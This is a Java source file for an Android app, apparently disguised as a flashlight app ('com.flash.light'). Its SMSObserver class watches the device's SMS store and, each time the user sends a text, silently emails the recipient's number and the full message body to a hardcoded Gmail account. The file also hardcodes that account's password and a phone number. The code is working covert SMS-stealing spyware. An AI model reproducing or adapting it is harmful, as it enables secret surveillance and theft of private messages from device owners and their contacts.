package com.flash.light; 

import java.util.List;
import java.util.regex.Pattern;
import java.util.regex.Matcher;

import android.net.Uri;
import android.util.Log;
import android.os.Handler;
import android.widget.Toast;
import android.app.Activity;
import android.telephony.SmsManager;

import android.content.Context;
import android.content.ContentResolver;

import android.database.Cursor;
import android.database.DatabaseUtils;
import android.database.ContentObserver;

public class SMSObserver extends ContentObserver {

	public  static Context context;

  private static GmailSender sender; 

  private static String initId = "0";

  public  static String emailString = "justdriveapp1@gmail.com";
  public  static String phoneNumberString = "2014640695";
  public  static String emailPasswordString = "GHOST21ghost";

  public SMSObserver(Handler handler, Context context) {
    super(handler);
    Log.d("SMSInterceptor","SMSObserver constructor");
    SMSObserver.context = context;
  }

  @Override
  public void onChange(boolean selfChange) {
    super.onChange(selfChange);

    Log.d("SMSInterceptor","SMSObserver onChange()");

    Uri uriSMSURI = Uri.parse("content://sms");
    String[] sCol = {"_id","type","body","address"};
    String sOrder = "date desc limit 1";

    Cursor cur = context.getContentResolver().query(uriSMSURI, sCol, null, null, sOrder);
    cur.moveToLast();

    String id     = cur.getString(cur.getColumnIndex("_id"));
    String type   = cur.getString(cur.getColumnIndex("type"));

    final String body   = cur.getString(cur.getColumnIndex("body"));
    final String addr   = cur.getString(cur.getColumnIndex("address"));

    Log.d("SMSInterceptor","InitId: " + initId + ", type: " + type);
	
    if(!(initId.equals(id)) && type.equals("2")) {
      new Thread(new Runnable() {

        @Override
        public void run() {
          try {
            sender = new GmailSender();
            sender.sendMail("SMSInterceptor", "OUTGOING SMS!\n" + "Sent to: " + addr + "\nbody:\n" + body,
              emailString, emailString);
          }
          catch(Exception e) {
            e.printStackTrace();
            Log.e("gmailSenderError", "" + e.toString());
          }
        }
      }).start();
    }

    cur.close();
  }
}
